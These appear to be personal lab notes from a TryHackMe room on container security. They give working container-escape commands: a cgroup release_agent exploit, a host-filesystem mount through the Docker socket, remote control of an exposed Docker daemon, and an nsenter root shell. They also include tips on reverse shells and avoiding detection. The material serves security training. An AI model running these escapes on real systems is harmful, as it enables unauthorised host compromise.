---
title: "Container Vulnerabilities"
parent: "DevSecOps"
grand_parent: "6 - Misc THM Notes"
nav_order: 3
layout: default
---

# Container Vulnerabilities

Normal Mode allows us to run commands on the Docker Engine, but Privileged Mode allows us to run commands on the Host. These are called capabilities which we can list with `capsh --print`. Ex if we have `mount`:
```
**1.** mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

**2.** echo 1 > /tmp/cgrp/x/notify_on_release

**3.** host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

**4.** echo "$host_path/exploit" > /tmp/cgrp/release_agent

**5.** echo '#!/bin/sh' > /exploit

**6.** echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit

**7.** chmod a+x /exploit

**8.** sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

-------
_Note: We can place whatever we like in the /exploit file (step 5). This could be, for example, a reverse shell to our attack machine._
```

	1. We need to create a group to use the Linux kernel to write and execute our exploit. The kernel uses "cgroups" to manage processes on the operating system. Since we can manage "cgroups" as root on the host, we'll mount this to "_/tmp/cgrp_" on the container.
	
	2. For our exploit to execute, we'll need to tell the kernel to run our code. By adding "1" to "_/tmp/cgrp/x/notify_on_release_", we're telling the kernel to execute something once the "cgroup" finishes. [(Paul Menage., 2004)](https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt).
	
	3. We find out where the container's files are stored on the host and store it as a variable.
	
	4. We then echo the location of the container's files into our "_/exploit_" and then ultimately to the "release_agent" which is what will be executed by the "cgroup" once it is released.
	
	5. Let's turn our exploit into a shell on the host
	
	6. Execute a command to echo the host flag into a file named "flag.txt" in the container once "_/exploit_" is executed.
	
	7. Make our exploit executable!
	
	8. We create a process and store that into "_/tmp/cgrp/x/cgroup.procs_". When the processs is released, the contents will be executed.

#### Vulnerability 2: Escaping via Exposed Docker Daemon
Unix sockets use the filesystem to transfer data rather than networking interfaces. This is known as Inter-process Communication (IPC). Unix sockets are substantially quicker at transferring data than TCP/IP sockets and use file system permissions. 

Docker uses sockets when interacting with the docker engine, such as `docker run`. 

We will use Docker to create a new container and mount the host's filesystem into this new container. Then we are going to access the new container and look at the host's filesystem.

Our final command will look like this: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`, which does the following:
	**1.** We will need to upload a docker image. For this room, I have provided this on the VM. It is called "alpine". The "alpine" distribution is not a necessity, but it is extremely lightweight and will blend in a lot better. To avoid detection, it is best to use an image that is already present in the system, otherwise, you will have to upload this yourself.
	**2**. We will use `docker run` to start the new container and mount the host's file system (/) to (/mnt) in the new container: `docker run -v /:/mnt` 
	**3.** We will tell the container to run interactively (so that we can execute commands in the new container): `-it`
	**4.** Now, we will use the already provided alpine image: `alpine`
	**5.** We will use `chroot` to change the root directory of the container to be _/mnt_ (where we are mounting the files from the host operating system): `chroot /mnt`
	**6.** Now, we will tell the container to run `sh` to gain a shell and execute commands in the container: `sh`

#### Vulnerability 3: Remote Code Execution via Exposed Docker Daemon
`nmap -sV -p 2375 10.10.22.205` - check if docker is in use on its default port

`curl http://targetIP:2375/version` - confirm we can access the docker daemon

`docker -H tcp://targetIP:2375 ps` - list containers on the target

other commands: 
- `network ls` - Used to list the networks of containers, we could use this to discover other applications running and pivot to them from our machine!
- `images` - List images used by containers; data can also be exfiltrated by reverse-engineering the image.
- `exec` - Execute a command on a container. 
- `run` - Run a container. 

#### Vulnerability 4: Abusing Namespaces
**Namespaces** segregate system resources such as processes, files, and memory away from other namespaces. Every process running on Linux will be assigned two things:

- A namespace
- A Process Identifier (PID)

Namespaces are how containerization is achieved! Processes can only "see" the process in the same namespace.

There shouldn't be a lot as each container only does a small number of things. 

For this vulnerability, we will be using `nsenter` (namespace enter). This command allows us to execute or start processes, and place them within the same namespace as another process. In this case, we will be abusing the fact that the container can see the "**/sbin/init**" process on the host, meaning that we can launch new commands such as a bash shell on the host. 

|                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Use the following exploit: `nsenter --target 1 --mount --uts --ipc --net /bin/bash`, which does the following:<br><br>  <br><br>**1.** We use the `--target` switch with the value of "**1**" to execute our shell command that we later provide to execute in the namespace of the special system process ID to get the ultimate root!<br><br>**2**. Specifying `--mount` this is where we provide the mount namespace of the process that we are targeting. _"If no file is specified, enter the mount namespace of the target process."_ [(Man.org., 2013)](https://man7.org/linux/man-pages/man1/nsenter.1.html).<br><br>**3.** The `--uts` switch allows us to share the same UTS namespace as the target process meaning the same hostname is used. This is important as mismatching hostnames can cause connection issues (especially with network services).<br><br>**4.** The `--ipc` switch means that we enter the Inter-process Communication namespace of the process which is important. This means that memory can be shared.<br><br>**5.** The `--net` switch means that we enter the network namespace meaning that we can interact with network-related features of the system. For example, the network interfaces. We can use this to open up a new connection (such as a stable reverse shell on the host).<br><br>**6.** As we are targeting the **"/sbin/init"** process #1 (although it's a symbolic link to "**lib/systemd/systemd**" for backwards compatibility), we are using the namespace and permissions of the [systemd](https://www.freedesktop.org/wiki/Software/systemd/) daemon for our new process (the shell)<br><br>**7.** Here's where our process will be executed into this privileged namespace: `sh` or a shell. This will execute in the same namespace (and therefore privileges) of the kernel. |
